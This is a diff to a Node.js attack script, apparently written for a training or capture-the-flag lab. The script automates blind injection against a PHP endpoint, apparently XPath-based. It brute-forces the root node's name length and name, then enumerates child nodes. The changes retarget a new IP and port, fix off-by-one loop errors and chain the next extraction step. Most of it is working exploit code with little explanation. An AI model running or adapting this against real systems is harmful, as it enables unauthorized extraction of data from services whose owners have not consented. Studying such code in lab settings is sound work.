@@ -2,7 +2,7 @@ const axios = require('axios');
 const cheerio = require('cheerio');
 
 // Define the endpoint URL
-const endpointUrl = 'http://94.237.58.148:31461/index.php';
+const endpointUrl = 'http://94.237.53.3:56208/index.php';
 
 // Function to determine the length of the root node's name
 async function determineRootNodeLength() {
@@ -19,11 +19,11 @@ async function determineRootNodeLength() {
             //console.log(payload)
             // Define the request headers
             const headers = {
-                'Host': '94.237.58.148:31461',
+                'Host': '94.237.53.3:56208',
                 'Content-Length': contentLength,
                 'Cache-Control': 'max-age=0',
                 'Upgrade-Insecure-Requests': '1',
-                'Origin': 'http://94.237.58.148:31461',
+                'Origin': 'http://94.237.53.3:56208',
                 'Content-Type': 'application/x-www-form-urlencoded',
             
             };
@@ -62,7 +62,7 @@ async function determineRootNodeName(rootNodeNameLength) {
     let loading = ''
     let rootNodeName = ''
 
-    for (let j = 1; j < rootNodeNameLength; j++) {
+    for (let j = 1; j <= rootNodeNameLength; j++) {
         
         for (let i = 0; i < alphabet.length; i++) {
             const char = alphabet[i];
@@ -74,11 +74,11 @@ async function determineRootNodeName(rootNodeNameLength) {
                 //console.log(payload)
                 // Define the request headers
                 const headers = {
-                    'Host': '94.237.58.148:31461',
+                    'Host': '94.237.53.3:56208',
                     'Content-Length': contentLength,
                     'Cache-Control': 'max-age=0',
                     'Upgrade-Insecure-Requests': '1',
-                    'Origin': 'http://94.237.58.148:31461',
+                    'Origin': 'http://94.237.53.3:56208',
                     'Content-Type': 'application/x-www-form-urlencoded',
                 
                 };
@@ -101,8 +101,9 @@ async function determineRootNodeName(rootNodeNameLength) {
                     //console.log(loading);
                     //continue;
                  } 
-                 if(rootNodeNameLength == rootNodeName.length+1) {
+                 if(rootNodeNameLength == rootNodeName.length) {
                     console.log(`Name: <${rootNodeName}>`);
+                    determineNumberChildNode(rootNodeName)
                     break;
                  } 
             } catch (error) {
@@ -117,9 +118,9 @@ async function determineRootNodeName(rootNodeNameLength) {
 }
 
 async function determineNumberChildNode(rootNodeName) {
+    console.log(`🦑Exfiltrating the Number of Child Nodes`)
     let number = 1;
-    let success = true;
-    
+    let success = true;    
     while (success) {
         try {
             
@@ -129,11 +130,11 @@ async function determineNumberChildNode(rootNodeName) {
             console.log(payload)
             // Define the request headers
             const headers = {
-                'Host': '94.237.58.148:31461',
+                'Host': '94.237.53.3:56208',
                 'Content-Length': contentLength,
                 'Cache-Control': 'max-age=0',
                 'Upgrade-Insecure-Requests': '1',
-                'Origin': 'http://94.237.58.148:31461',
+                'Origin': 'http://94.237.53.3:56208',
                 'Content-Type': 'application/x-www-form-urlencoded',
             
             };
